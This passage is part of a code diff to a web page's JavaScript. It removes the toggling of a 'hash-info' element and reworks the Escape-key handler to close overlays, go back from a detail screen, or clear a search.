     document.getElementById('link-banner').style.display = 'flex';
-    document.getElementById('hash-info').style.display = 'block';
     setTimeout(function(){
       document.getElementById('qc-pass').focus();
     }, 300);
@@ -590,17 +1131,21 @@ window.addEventListener('load', function(){
     document.getElementById('qc-section').style.display = 'none';
     document.getElementById('full-setup-section').style.display = 'block';
     document.getElementById('link-banner').style.display = 'none';
-    document.getElementById('hash-info').style.display = 'none';
   }
 });
 
 /* ===== KEYBOARD SHORTCUTS ===== */
 document.addEventListener('keydown', function(e){
   if(e.key === 'Escape'){
-    if(document.getElementById('qc-section').style.display === 'block'){
-      document.getElementById('qc-pass').value = '';
+    if(document.querySelector('.overlay.show')){
+      document.querySelectorAll('.overlay.show').forEach(function(el){
+        el.classList.remove('show');
+      });
+    } else if(document.getElementById('detail-screen').style.display === 'flex'){
+      goBack();
+    } else {
+      clearSearch();
     }
-    clearSearch();
   }
 });
 
